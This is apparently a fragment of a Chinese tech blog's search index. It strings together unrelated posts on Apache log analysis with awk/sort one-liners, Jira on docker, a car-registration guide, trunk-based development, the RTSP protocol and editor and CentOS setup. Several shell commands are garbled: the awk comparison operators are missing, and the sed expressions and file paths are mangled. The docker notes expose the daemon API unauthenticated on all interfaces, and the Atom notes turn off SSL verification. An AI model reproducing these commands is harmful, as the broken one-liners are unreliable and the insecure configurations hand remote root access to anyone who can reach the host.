“Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; GTB6.3)”\n\n问题1：在apachelog中找出访问次数最多的10个IP。\n\nawk '{print $1}' apachelog |sort |uniq -c|sort -nr|head -n 10\n\nawk 首先将每条日志中的IP抓出来，如日志格式被自定义过，可以 -F 定义分隔符和 print指定列；\n\nsort进行初次排序，为的使相同的记录排列到一起；\n\nupiq -c 合并重复的行，并记录重复次数。\n\nhead进行前十名筛选；\n\nsort -nr按照数字进行倒叙排序。\n\n我参考的命令是：\n\n显示10条最常用的命令\n\nsed -e \"s/| //n/g\" ~/.bashhistory | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head\n\n问题2：在apache日志中找出访问次数最多的几个分钟。\n\nawk '{print $4}' accesslog |cut -c 14-18|sort|uniq -c|sort -nr|head\n\nawk 用空格分出来的第四列是[09/Jan/2010:00:59:59；\n\ncut -c 提取14到18个字符\n\n剩下的内容和问题1类似。\n\n问题3：在apache日志中找到访问最多的页面：\n\nawk '{print $11}' apachelog |sed 's/^.cn/(.*/)/\"//1/g'|sort |uniq -c|sort -rn|head\n\n类似问题1和2，唯一特殊是用sed的替换功能将”http://www.a.cn/common/index.php”替换成括号内的内容：”http://www.a.cn（/common/index.php）”\n\n问题4：在apache日志中找出访问次数最多（负载最重）的几个时间段（以分钟为单位），然后在看看这些时间哪几个IP访问的最多？\n\n1,查看apache进程:\n\nps aux | grep httpd | grep -v grep | wc -l\n\n2,查看80端口的tcp连接:\n\nnetstat -tan | grep \"ESTABLISHED\" | grep \":80\" | wc -l\n\n3,通过日志查看当天ip连接数，过滤重复:\n\ncat accesslog | grep \"19/May/2011\" | awk '{print $2}' | sort | uniq -c | sort -nr\n\n4,当天ip连接数最高的ip都在干些什么(原来是蜘蛛):\n\ncat accesslog | grep \"19/May/2011:00\" | grep \"61.135.166.230\" | awk '{print $8}' | sort | uniq -c | sort -nr | head -n 10\n\n5,当天访问页面排前10的url:\n\ncat accesslog | grep \"19/May/2010:00\" | awk '{print $8}' | sort | uniq -c | sort -nr | head -n 10\n\n6,用tcpdump嗅探80端口的访问看看谁最高\n\ntcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F\".\" '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -nr\n\n接着从日志里查看该ip在干嘛:\n\ncat accesslog | grep 220.181.38.183| awk '{print $1\"/t\"$8}' | sort | uniq -c | sort -nr | less\n\n7,查看某一时间段的ip连接数:\n\ngrep \"2006:0[7-8]\" www20110519.log | awk '{print $2}' | sort | uniq -c| sort -nr | wc -l\n\n8,当前WEB服务器中联接次数最多的20条ip地址:\n\nnetstat -ntu |awk '{print $5}' |sort | uniq -c| sort -n -r | head -n 20\n\n9,查看日志中访问次数最多的前10个IP\n\ncat accesslog |cut -d ' ' -f 1 |sort |uniq -c | sort -nr | awk '{print $0 }' | head -n 10 |less\n\n10,查看日志中出现100次以上的IP\n\ncat accesslog |cut -d ' ' -f 1 |sort |uniq -c | awk '{if ($1   100) print $0}'｜sort -nr |less\n\n11,查看最近访问量最高的文件\n\ncat accesslog |tail -10000|awk '{print $7}'|sort|uniq -c|sort -nr|less\n\n12,查看日志中访问超过100次的页面\n\ncat accesslog | cut -d ' ' -f 7 | sort |uniq -c | awk '{if ($1   100) print $0}' | less\n\n13,列出传输时间超过 30 秒的文件\n\ncat accesslog|awk '($NF   30){print $7}'|sort -n|uniq -c|sort -nr|head -20\n\n14,列出最最耗时的页面(超过60秒的)的以及对应页面发生次数\n\ncat access_log |awk '($NF   60 \u0026\u0026 $7~//.php/){print $7}'|sort -n|uniq -c|sort -nr|head -100","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/jira","title":"jira","text":"docker exec -i mariadb mysql -uroot -p -e \"GRANT ALL PRIVILEGES ON jira.* TO 'jira'@'%' IDENTIFIED BY 'jira2017'; FLUSH PRIVILEGES;\"\ndocker exec -i mariadb mysql -ujira -pjira2017 -e \"CREATE DATABASE IF NOT EXISTS jira DEFAULT CHARSET utf8 COLLATE utf8generalci;\"\n\ndocker run -d --restart=always --name jira -p 8080:8080 rinetd/jira","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 车管所挂牌攻略","title":"车管所挂牌攻略","text":"本论坛上有临沂的朋友讲了临沂市大市车管所的车辆挂牌流程，下面由我给大家分享一下在临沂市经开区挂牌的经历。\n主要流程3步:\n购买保险\n验车 (1:00上班)\n叫号排队上牌(中午不休)\n临沂市经开区车管所，属于临沂市第三车管所，地处临沂市沂河东路和昆明交叉口西500米路南。该所没有市车管所那么大，在内各部室走路路程要短很多。\n经开区车管所-临沂市第三车管所\n\n如果赶上汽车销售旺季，比如元旦、五一、十一等，要提前去，9点开始上班，如果自己去挂牌，最好6点就去排队。\n进大门之后有两个检测道路，右拐是新车注册登记，左拐是二手车过户登记，不要走错了。\n1.携带材料：车辆合格证、购车发票（]注册登记联）、车辆购置税副本、车主身份证复印件、代办的代办人复印件。\n(注意)：车辆购置税可以提前买好，因为不在一个院里，买车辆购置税的地方在该车管所对面的检测线内，要走的尽头，购税大厅在尽头东侧，不收现金，一律刷卡。\n\n2.上班后，携带材料到查验室打印车辆公告（待会查验员要对着看车架号）。打出公告后到车旁等候，查验员出来后，配合他做好车架、发动机号之类的核验，无误后他就拍照。\n(注意)：此时要做好车架号拓号，自费15元到隔壁广发那买拓号纸。如果车主本人去，出厂时车辆自带的拓号也能用，若是代办的，必须买拓号纸。\n3.此处很细：：：：\n          1）拍完照后，再次拿起材料（这是多了检测的公告）再回查验室，等查验员签字\n         （2）查验员签字-复核员盖章（查验室最西边那位）\n         （3）盖章后录入电脑（查验室中间那位，就是刚开始给打公告的那位），此时要注意，如果录信息（录流水）时有数据不对需要调整的，还要到大市车管所去调整。这就是分所的不便之处！！\n(注意:)一定要拿到流水单后 再进行下一步骤!!!\n4.完了就去办理大厅排队，排队也的说下，是到咨询台人工授号！\n5.领取号码后，就是等待叫号，叫号后，递交材料，由大厅人员录入电脑，此时，她会给你一个“车辆信息信息”的一个单子，你持单子到对面选号处选号。\n6.选号有自由选好和随机选号，自由选号五次机会，有编码规则，只需输入心里想的号码，系统会根据编号规则，推荐号码，除了豹子号、年度号，都差不多，选一个号码。\n7.选完号再回刚才为你办理业务的柜台处，此时她会给你打印登记证书、行驶证、年检贴，当然要交费130元。\n8.还没完呢，车牌还没有。\n9.取车牌，需要到大市车管所“号码安装处”领取车牌，全市区（是市区）的车牌制作都在这一个屋里。领取车牌需要你的行驶证和挂牌发票（130那个），大约等30分钟拿牌。\n10.牌拿到手了，你可以买车牌托，也可不买，找4S店或者其他人员帮忙上牌。\n\n只要自己勤快一些，不要着急，人多的时候1天准能办完（要早去），人少的时候，半天就办完！","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-10-04 docker","title":"Awesome docker","text":"WEB UI\nseagull is Friendly Web UI to manage and monitor docker\ndocker run -d -p 10086:10086 -v /var/run/docker.sock:/var/run/docker.sock tobegit3hub/seagull\n\n  Multi-host\n  Seagull supports monitoring multiple servers. Make sure you start docker daemon like this.\ndocker -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock -api-enable-cors=true -d","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/基于主干的开发(TBD) Trunk Based Development","title":"基于主干的开发(TBD) Trunk Based Development","text":"Trunk Based Development，缩写为TBD，中文就是基于主干的开发。\n\n什么是TBD，无需太多文字，看下图即可（来源http://paulhammant.com/2013/04/05/what-is-trunk-based-development/）：\n\n有人反映看不大懂，好吧，我懒得码字，引用一段TBD的说明文字（来源http://nedwu13.blogspot.kr/2014/01/tbd-what-is-trunk-based-development.html），下面这三句话是关键点：\n\n   同一个产品开发的所有人员共享一个Repository，有一个trunk，单一Developer或是Developer团队可以有自己的private branch，所有修改最后都会回到主干\n   只有在Release时才会有官方的分支，一般Developer不能对Release Branch作动作，只有Release Engineer可以更动Release Branch，当Release Branch完成它的任务，就会被砍掉\n   Bug先在trunk修好，之後把Commit合併到Release Branch，而不是在Release Branch修好再整合到trunk，這樣可以把修改Release Branch的人限制在最小程度。\n\n感谢nedwu13的翻译。\n\n版本管理策略无非两种：基于主干的Trunk Based和基于分支的Feature Branching，而Feature Branching又可以细分为Release Feature Branching、Integration Feature Branching和Build Feature Branching，不管哪种Feature Branching，在DevOps文化里，皆为妖魔鬼怪，存在的主要问题为：\n\n   一个功能模块，或者说是Feature，会存在多个分支上，那么好了，想改点东西，先要知道这个Feature存在在哪几个分支上，然后挨个看一遍，哪个需要改、哪个不需要改，要改的东西可能还不一样，改完了还要挨个测试一遍\n   合并困难，那么多分支，分支到主干、主干到分支，多路双向合并，想想都头大，所以一般就不合并了，挨个改一遍好了\n\n三种基于分支的版本管理策略详解，参见链接 http://www.alwaysagileconsulting.com/articles/version-control-strategies/\n\n讀過了Perforce官方的mainline model的文件，又看到Google與Facebook都使用TBD，以及我自己在開發上遇到的問題，讓我想看看TBD到底如何可以幫助我們解決這些工程上的問題，看起來作者非常反對feature branch，而我自己親身經歷的感受也的確，要開feature branch，除非能做到Perforce官方推薦的經營方式，不然不只Merge會有災難，開發時也是災難連連。以人性角度來說，假設我做componentA，如果有10個feature branch都有componentA，那每個branch有問題我都要去看，我修了一個componentA的問題，由於每個branch分支出去的時間點不同，其它branch有的可能有，有的可能沒有這個問題，那我怎辦，只能等著人家來報問題，那我的時間很多都花在解這些Branch的問題上。如果採用的是TBD的概念，我只要保證trunk沒問題就可以了。或許在code撰寫方式上需要花很多工，但是我只需一次工，也可以將焦點集中在一個地方。對於我這種普通人，這是比較人性化的工作方式。\n\n甚麼是TBD\n\n   一個軟體開發的分支模型，也被稱作mainline\n   同一個產品開發的所有人員共享一個Repository，有一個trunk，單一Developer或是Developer團隊可以有自己的private branch，所有修改最後都會回到主幹\n   只有在Release時才會有官方的分支，一般Developer不能對Release Branch作動作，只有Release Engineer可以更動Release Branch，當Release Branch完成它的任務，就會被砍掉。\n   Google與Facebook都採用這種分支模型\n\n有需要Release才Branch\n\n   Release之後的branch，就不會有大的更動，只有Release Engineer會進行將挑選Commit合併到Release Branch的動作\n   多一個Release Engineer的帽子\n   Bug先在trunk修好，之後把Commit合併到Release Branch，而不是在Release Branch修好再整合到trunk，這樣可以把修改Release Branch的人限制在最小程度。\n\nDeveloper的責任\n\n   每個Developer都要保證Build會成功\n   Google與Facebook在新進員工訓練下很多工夫在這上面。一開始沒生產沒關係，但是不要讓公司產品Build不出來！\n   Rollback/revert是最後不得已的策略\n   複雜產品或是大公司都會有一堆Pre-Commit認證。\n   Developer應該養成習慣，證明Commit是沒問題的：\n\n       Commit之前把Code更新到最新\n       以最新的狀態將整個產品重Build一次\n       確認更改到的功能無誤(當然關聯的功能也要確認一下)\n       Commit，總算搞定，休息一下\n\n當某個功能花太長時間才能開發完\n\n   使用Branch By Abstraction (2013重提)\n   避免Branch到處開，最後整合不回來\n\n什麼不是TBD\nTBD Quick cheklist\n\n   Developer幾乎只commit到單一trunk\n   Release Engineer創建Release Branches, 幾乎只把Commit整合到Release Branch\n   用「幾乎只」來形容是因為如果bug無法在trunk重現(有可能是相關的code已被改變)，那Developer就要在Release Branch上修正，然後把Commit整合到trunk。\n\n如果應用Release Branch的概念，請記住：\n\n   TBD代表Developer不能Commit到Release Branch\n   TBD代表你將會刪除不再使用的Release Branches，不會做任何整合回trunk的動作\n\nDeveloper需要Commit到多個Branch\n\n   當然不是TBD\n   如果想要Branch，請使用Branch by Abstraction\n   老鳥總是會說有Special Case需要Branch\n   重點就是合併的複雜度，10個Branch，每個人都在那邊Commit來Commit去，有些相關，有些不相關，有些Commit到2個Branch，有些Commit到1個Branch。這我超有感，我們團隊面臨到的狀況正是如此。\n   To Branch or Not to Branch?這是已經被爭論許久的問題。\n   作者說除了Release Branch之外，不應該有任何Branch在共用的Repository上，但是Developer或是Developer團隊可以有自己的Private Branch。\n   就算Feature需要花很長的時間做而且沒時間花在整合上，還是不應該Branch by Feature，應該使用Branch by Abstraction。我們團隊遇到大Feature就會開一個Branch，由於這種Featrue Branch沒人經營，Feature開發中後期，就會花很多時間在整合，而複雜度隨著Commit數量增加越來越複雜，最後只要提到要整合回mainline，每個人的態度都是把一切交給命運。\n\n沒有在Branch上作持續整合\n\n   不是TBD\n   很多Open Source的Developer聲稱沒有持續整合也不會怎樣，作者建議有10個以上的Developer就應該要做持續整合。個人認為就算1個也應該做，誰敢說自己完全不會改壞自己的Code。\n\n手動管理Component Dependency版號\n\n   對外來的Component，通常都是用外面已經Build好的穩定版本，版號是固定的，可以直接寫Build管理檔案內(例如makefile，Maven的pom.xml)\n   對於內部的Component，自己手動指定該Build所需的Component版號(Ex:1.1.2之類)，很容易造成不知到哪個版本的產品該用哪個版本的Component，要嘛就是把Code拉近Product Dir裡面全部Compnent都Build新的，要嘛就是根據Perforce或SVN的Revision Number，或是用Jenkins產的Build Number。手動是複雜度的地獄。\n\n範例：\nPerforce或SVN的架構\ntrunk\n\n   component1\n   component2\n   component3\n   component4\n   productA\n   productB\n\nrelease\nprivate\n\nproductA用到component1，component3\nproductB用到component2，component4\n\n要Build productA，CI可以先build component1，component2，然後build productA，但因為可能component1不斷開發，已經到了reversion=1500，而productA不需要reversion=1234後續開發的功能，就可選擇從component1的reversion=1234抓code過來build。或是直接把compoent1的reversion=1234的code放到到productA底下，目錄架構就會變成\ntrunk\n    component1\n    component2\n    productA\n         component1\n         component2\n在Perforce有Module這個概念可以應用，History也會留存。\n\nCI不是從Root開始Build\n\n   CI在Build所有的Component都應該重新開始Build，不可以有任何的快取，或是已經Build好的Component，因為這樣無法反應code的最新狀態。\n\n用詞不當\nMainline意指其他事物\n基本上Mainline就是指TBD，不過在1993年的ClearCase，它的mainline長的如下圖：\n\n這是一個非常花時間的Branch Model，它的精神就是最後才整合，與TBD的早期整合正好相反。\n上圖的劇本：\n\n   mainline開發一段時間，Branch出1.1.x\n   mainline繼續開發，1.1.x也繼續開發\n   接下來1.1.0要Release，即將合併回mainle，maineline因為要開發1.2.x，害怕1.1.0整合進來會很亂，所以先Branch出1.2。\n   1.1.x功能告一段落，1.1.0Release，此時合併回mainline，由於mainline的code已經不太相同，合併就是災難。\n   1.2繼續開發，mainline繼續處理混亂狀態\n   1.1.1Release，因為1.2需要有1.1的功能，所以又要合併回mainline，剛處理好混亂狀態的mainline要再處理一次混亂\n   mainline處理完混亂，開始合併到1.2.x，因為兩個branch長得又不太一樣，所以又是災難\n   1.2處理完mainline下來的混亂之後，終於可以Release 1.2.0\n\n可以看到，每次合併都是一場災難，而這個災難的次數還真不少。其實我們也是使用這個方式，由於有兩個以上的新版本同時開發，branch出去，branch執行有問題也不知道找誰修，要再回到mainline又是一堆工，雖然Branch by Abstraction不見得是萬靈丹，但作者提出的問題我已經有親身體會。\n\nFeature Toggle\nMartin Flower歸納出來的名詞，這個技巧是對一些已實作或是實作中，但還不想開放的功能，目前有些人以為這是與TBD一起用的，其實不然，這招早就存在，分為以下兩種\n\n   Toggles at runtime，執行時期判斷旗標，看要不要開放此功能。\n   Toggles at build time，建置時間判斷建置參數，看要不要把功能相關程式碼build進去。\n\n不管如何，CI Server可以很好地對應這種需求\n\nBranching is not the problem, merging is the problem\n這就是TBD所想要解決的問題，Branch很方便，不是毒蛇猛獸，但是要如何管理好Branch，就是軟體工程的奧妙之處。","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-28 RTSP交互命令简介及过程参数描述","title":"RTSP交互命令简介及过程参数描述","text":"links\nReal Time Streaming Protocol或者RTSP（实时流媒体协议），是由Real network 和 Netscape共同提出的如何有效地在IP网络上传输流媒体数据的应用层协议。RTSP提供一 种可扩展的框架，使能够提供可控制的，按需传输实时数据，比如音频和视频文件。源数据可以包括现场数据的反馈和存贮的文件。rtsp对流媒体提供了诸如暂停，快进等控制，而它本身并不传输数据，rtsp作用相当于流媒体服务器的远程控制。传输数据可以通过传输层的tcp，udp协议，rtsp也提供了基于rtp传输机制的一些有效的方法。\n\n目录 [hide]\n\n    1 RTSP消息格式\n    2 简单的rtsp交互过程\n    3 rtsp中常用方法\n        3.1 OPTION\n        3.2 DESCRIBE\n        3.3 SETUP\n        3.4 PLAY\n        3.5 PAUSE\n        3.6 TEARDOWN\n        3.7 其他方法\n    4 sdp的格式\n    5 RTSP点播消息流程实例\n\nRTSP消息格式\n\nRTSP的消息有两大类,一是请求消息(request),一是回应消息(response),两种消息的格式不同.\n请求消息:\n\n方法 URI RTSP版本 CR LF\n消息头 CR LF CR LF\n消息体 CR LF\n\n其中方法包括OPTION回应中所有的命令,URI是接受方的地址,例如\nrtsp://192.168.20.136\n\nRTSP版本一般都是 RTSP/1.0.每行后面的CR LF表示回车换行，需要接受端有相应的解析，最后一个消息头需要有两个CR LF\n回应消息:\n\nRTSP版本 状态码 解释 CR LF\n消息头 CR LF CR LF\n消息体 CR LF\n\n其中RTSP版本一般都是RTSP/1.0,状态码是一个数值,200表示成功,解释是与状态码对应 的文本解释。\n简单的rtsp交互过程\n\nC表示rtsp客户端,S表示rtsp服务端\n\n1.C-  S:OPTION request //询问S有哪些方法可用\n1.S-  C:OPTION response //S回应信息中包括提供的所有可用方法\n\n2.C-  S:DESCRIBE request //要求得到S提供的媒体初始化描述信息\n2.S-  C:DESCRIBE response //S回应媒体初始化描述信息，主要是sdp\n\n3.C-  S:SETUP request //设置会话的属性，以及传输模式，提醒S建立会话\n3.S-  C:SETUP response //S建立会话，返回会话标识符，以及会话相关信息\n\n4.C-  S:PLAY request //C请求播放\n4.S-  C:PLAY response //S回应该请求的信息\n\n5.S-  C:发送流媒体数据\n\n6.C-  S:TEARDOWN request //C请求关闭会话\n6.S-  C:TEARDOWN response //S回应该请求\n\n上述的过程是标准的、友好的rtsp流程，但实际的需求中并不一定按部就班来。\n其中第3和4步是必需的！\n第一步，只要服务器客户端约定好，有哪些方法可用，则option请求可以不要。第二步，如果我们有其他途径得到媒体初始化描述信息（比如http请求等等），则我们也不需要通过rtsp中的describe请求来完成。第五步，可以根据系统需求的设计来决定是否需要。\nrtsp中常用方法\nOPTION\n\n目的是得到服务器提供的可用方法:\n\nOPTIONS rtsp://192.168.20.136:5000/xxx666 RTSP/1.0\nCSeq: 1 //每个消息都有序号来标记，第一个包通常是option请求消息\nUser-Agent: VLC media player (LIVE555 Streaming Media v2005.11.10)\n\n服务器的回应信息包括提供的一些方法,例如:\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 1 //每个回应消息的cseq数值和请求消息的cseq相对应\nPublic: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, SCALE,\nGETPARAMETER //服务器提供的可用的方法\n\nDESCRIBE\n\nC向S发起DESCRIBE请求,为了得到会话描述信息(SDP):\n\nDESCRIBE rtsp://192.168.20.136:5000/xxx666 RTSP/1.0\n\nCSeq: 2\ntoken:\nAccept: application/sdp\nUser-Agent: VLC media player (LIVE555 Streaming Media v2005.11.10)\n\n服务器回应一些对此会话的描述信息(sdp):\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 2\nx-prev-url: rtsp://192.168.20.136:5000\nx-next-url: rtsp://192.168.20.136:5000\nx-Accept-Retransmit: our-retransmit\nx-Accept-Dynamic-Rate: 1\nCache-Control: must-revalidate\nLast-Modified: Fri, 10 Nov 2006 12:34:38 GMT\nDate: Fri, 10 Nov 2006 12:34:38 GMT\nExpires: Fri, 10 Nov 2006 12:34:38 GMT\nContent-Base: rtsp://192.168.20.136:5000/xxx666/\nContent-Length: 344\nContent-Type: application/sdp\n\nv=0 //以下都是sdp信息\no=OnewaveUServerNG 1451516402 1025358037 IN IP4 192.168.20.136\ns=/xxx666\nu=http:///\ne=admin@\nc=IN IP4 0.0.0.0\nt=0 0\na=isma-compliance:1,1.0,1\n\na=range:npt=0-\nm=video 0 RTP/AVP 96 //m表示媒体描述，下面是对会话中视频通道的媒体描述\na=rtpmap:96 MP4V-ES/90000\na=fmtp:96\nprofile-level-id=245;config=000001B0F5000001B509000001000000012000C888B0E0E0FA62D089028307\n\na=control:trackID=0//trackID＝0表示视频流用的是通道0\n\nSETUP\n\n客户端提醒服务器建立会话,并确定传输模式:\n\nSETUP rtsp://192.168.20.136:5000/xxx666/trackID=0 RTSP/1.0\nCSeq: 3\nTransport: RTP/AVP/TCP;unicast;interleaved=0-1\nUser-Agent: VLC media player (LIVE555 Streaming Media v2005.11.10)\n\nuri中带有trackID＝0，表示对该通道进行设置。Transport参数设置了传输模式，包\n的结构。接下来的数据包头部第二个字节位置就是interleaved，它的值是每个通道都\n不同的，trackID＝0的interleaved值有两个0或1，0表示rtp包，1表示rtcp包，接受端\n根据interleaved的值来区别是哪种数据包。\n\n服务器回应信息:\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 3\nSession: 6310936469860791894 //服务器回应的会话标识符\nCache-Control: no-cache\nTransport: RTP/AVP/TCP;unicast;interleaved=0-1;ssrc=6B8B4567\n\nPLAY\n\n客户端发送播放请求:\n\nPLAY rtsp://192.168.20.136:5000/xxx666 RTSP/1.0\nCSeq: 4\nSession: 6310936469860791894\nRange: npt=0.000- //设置播放时间的范围\nUser-Agent: VLC media player (LIVE555 Streaming Media v2005.11.10)\n\n服务器回应信息:\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 4\nSession: 6310936469860791894\nRange: npt=0.000000-\nRTP-Info: url=trackID=0;seq=17040;rtptime=1467265309\n//seq和rtptime都是rtp包中的信息\n\nPAUSE\n\n客户端发起暂停请求:\n\nPAUSE rtsp://192.168.20.136:5000/xxx666 RTSP/1.0\nCseq: 5\nSession: 6310936469860791894\n\n服务器回应:\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 5\nSession: 6310936469860791894\n\nTEARDOWN\n\n客户端发起关闭请求:\n\nTEARDOWN rtsp://192.168.20.136:5000/xxx666 RTSP/1.0\nCSeq: 6\nSession: 6310936469860791894\nUser-Agent: VLC media player (LIVE555 Streaming Media v2005.11.10)\n\n服务器回应:\n\nRTSP/1.0 200 OK\nServer: UServer 0.9.7rc1\nCseq: 6\nSession: 6310936469860791894\nConnection: Close\n\n其他方法\n\n以上方法都是交互过程中最为常用的,其它还有一些重要的方法如:\nget/setparameter,pause,redirect等等\nsdp的格式\n\nv=version\no=username session id version network type address type address\ns=session name\ni=session description\nu=URI\ne=email address\np=phone number\nc=network type address type connection address\nb=modifier:bandwidth-value\nt=start time stop time\nr=repeat interval active duration list of offsets from start-time\nz=adjustment time offset adjustment time offset ....\nk=method\nk=method:encryption key\na=attribute\na=attribute:value\nm=media port transport fmt list\nv = （协议版本）\no = （所有者/创建者和会话标识符）\ns = （会话名称）\ni =  （会话信息）\nu =  （URI 描述）\ne =  （Email 地址）\np =  （电话号码）\nc =  （连接信息）\nb =  （带宽信息）\nz =  （时间区域调整）\nk =  （加密密钥）\na =  （0 个或多个会话属性行）\n时间描述：\nt = （会话活动时间）\nr =  （0或多次重复次数）\n媒体描述：\nm = （媒体名称和传输地址）\ni =  （媒体标题）\nc =  （连接信息 — 如果包含在会话层则该字段可选）\nb =  （带宽信息）\nk =  （加密密钥）\na =  （0 个或多个媒体属性行）\n\nRTSP点播消息流程实例\n\n客户端：VLC\nRTSP服务器：LIVE555 Media Server\n\n1)C(Client)-  M(Media Server)\nOPTIONS rtsp://192.168.1.109/1.mpg RTSP/1.0\nCSeq: 1\nuser-Agent: VLC media player(LIVE555 Streaming Media v2007.02.20)\n\n1)M -  C\nRTSP/1.0 200 OK\nCSeq: 1\nDate: wed, Feb 20 2008 07:13:24 GMT\nPublic: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE\n\n2)C -  M\nDESCRIBE rtsp://192.168.1.109/1.mpg RTSP/1.0\nCSeq: 2\nAccept: application/sdp\nUser-Agent: VLC media player(LIVE555 Streaming Media v2007.02.20)\n\n2)M -  C\nRTSP/1.0 200 OK\nCSeq: 2\nDate: wed, Feb 20 2008 07:13:25 GMT\nContent-Base: rtsp://192.168.1.109/1.mpg/\nContent-type: application/sdp\nContent-length: 447\nv=0\no =- 2284269756 1 IN IP4 192.168.1.109\ns=MPEG-1 or 2 program Stream, streamed by the LIVE555 Media Server\ni=1.mpg\nt=0 0\na=tool:LIVE555 Streaming Media v2008.02.08\na=type:broadcast\na=control:\na=range:npt=0-66.181\na=x-qt-text-nam:MPEG-1 or Program Stream, streamed by the LIVE555 Media Server\na=x-qt-text-inf:1.mpg\nm=video 0 RTP/AVP 32\nc=IN IP4 0.0.0.0\na=control:track1\nm=audio 0 RTP/AVP 14\nc=IN IP4 0.0.0.0\na=control:track2\n\n3)C -  M\nSETUP rtsp://192.168.1.109/1.mpg/track1 RTSP/1.0\nCSeq: 3\nTransport: RTP/AVP; unicast;clientport=1112-1113\nUser-Agent: VLC media player(LIVE555 Streaming Media v2007.02.20)\n\n3)M -  C\nRTSP/1.0 200 OK\nCSeq: 3\nDate: wed, Feb 20 2008 07:13:25 GMT\nTransport: RTP/AVP;unicast;destination=192.168.1.222;source=192.168.1.109;clientport=1112-1113;serverport=6970-6971\nSession: 3\n\n4)C -  M\nSETUP rtsp://192.168.1.109/1.mpg/track2 RTSP/1.0\nCSeq: 4\nTransport: RTP/AVP; unicast;clientport=1114-1115\nSession: 3\nUser-Agent: VLC media player(LIVE555 Streaming Media v2007.02.20)\n\n4)M -  C\nRTSP/1.0 200 OK\nCSeq: 4\nDate: wed, Feb 20 2008 07:13:25 GMT\nTransport: RTP/AVP;unicast;destination=192.168.1.222;source=192.168.1.109;clientport=1114-1115;serverport=6972-6973\nSession: 3\n\n5)C -  M\nPLAY rtsp://192.168.1.109/1.mpg/ RTSP/1.0\nCSeq: 5\nSession: 3\nRange: npt=0.000-\nUser-Agent: VLC media player(LIVE555 Streaming Media v2007.02.20)\n\n5)M -  C\nRTSP/1.0 200 OK\nCSeq: 5\nRange: npt=0.000-\nSession: 3\nRTP-Info: url=rtsp://192.168.1.109/1.mpg/track1;seq=9200;rtptime=214793785,url=rtsp://192.168.1.109/1.mpg/track2;seq=12770;rtptime=31721\n\n(开始传输流媒体…)","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/文档生成器/2016-10-04 Daux.io","title":"Daux.io","text":"https://github.com/justinwalsh/daux.io\n\nDaux.io是一个开源的项目文档生成器，可以帮助用户快速生成漂亮的项目文档，此外，用户还可以通过简单的文件结构和Markdown文件来创建自定义格式的文档。\n特征\n    100%移动响应\n    支持GitHub Flavored Markdown\n    自动创建主页/登陆页\n    自动语法提示\n    自动生成导航\n    4款内置主题并支持自定义主题\n    功能、扁平化设计\n    共享/可链接的SEO友好性URL\n    基于Bootstrap构建\n    无需设置步骤\n    友好的Git/SVN\n    Google Analytics\n    可选的代码浮动布局\n\nDemos\n\nDaux.io\n\n使用方法\n\n下载后，解压，然后拷贝到可以运行PHP的Web服务器，你也可以使用Grunt.js在本地运行。\n\n主页：http://daux.io/\n\nGitHub托管页面：https://github.com/justinwalsh/daux.io","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/文档生成器/2016-10-04 Readthedocs","title":"readthedocs","text":"https://github.com/rtfd/readthedocs.org","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 Atom ","title":"文本编辑 Atom","text":"---\r\n\r\nAtom\nAtom 中文社区\nAtom飞行手册翻译\n\natom source\n\n快捷键\ni\t                     tree-view:toggle-vcs-ignored-files\nCtrl + L              # Select Line \t选定一行 \t\nShift + Home          # Select First Character of Line \t选定光标至行首 \t\nCtrl + Shift + Home   # Select to Top \t选定光标处至文档首行\nCtrl + Shift + K      # Delete Line \t删除一行 \t\nctrl + tab\n添加环境变量\necho PATH=/usr/share/atom-beta/resources/app/apm/bin:\\$PATH     ~/.bashrc\n代理设置\napm -v\r\n  apm  1.9.2\r\n  npm  2.13.3\r\n  node 0.10.40\r\n  python 2.7.11+\r\n  git 2.7.4\r\n\r\napm install --check\r\napm config set strict-ssl false\r\napm config set proxy http://localhost:8087\r\napm config set https-proxy http://localhost:8087\r\napm config delete http-proxy\r\n\r\n\r\napm config set registry http://registry.npm.taobao.org\r\n\r\n手动安装插件\r\ncd ~/.atom/packages\r\ngit clone https://github.com/emmetio/emmet-atom\r\ncd emmet-atom\r\nnpm install\r\nfontFamily: \"DejaVu Sans Mono,文泉驿正黑\"\r\n'DejaVu Sans Mono', 'Source Han Sans CN'\r\n插件\r\n增加颜色显示 color\r\napm install pigments\r\n\r\n","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 CentOS常见问题","title":"CentOS7常见问题","text":"镜像\nhttps://mirrors.tuna.tsinghua.edu.cn/help/centos/\n\nyum install -y ntp\nntpdate -u cn.ntp.org.cn\nansible all -a \"ntpdate -u cn.ntp.org.cn\"\n\nsudo mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak\nsudo tee  /etc/yum.repos.d/CentOS-Base.repo \u003c","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/文档生成器/2016-10-04 apidoc","title":"RESTful API 文档生成工具[apidoc]","text":"apidoc \n\napidoc 是一个简单的 RESTful API 文档生成工具，它从代码注释中提取特定格式的内容，生成文档。\n目前支持支持以下语言：C#、C/C++、D、Erlang、Go、Groovy、Java、Javascript、Pascal/Delphi、\nPerl、PHP、Python、Ruby、Rust、Scala 和 Swift。\n\n具体文档可参考：http://apidoc.tools\n\n/*\n @api get /users 获取所有的用户信息\n @apiGroup users\n @apiQuery page int 显示第几页的内容\n @apiQuery size int 每页显示的数量\n  @apiSuccess 200 ok\n @apiParam count int 符合条件的所有用户数量\n @apiParam users array 用户列表。\n @apiExample json\n {\n \"count\": 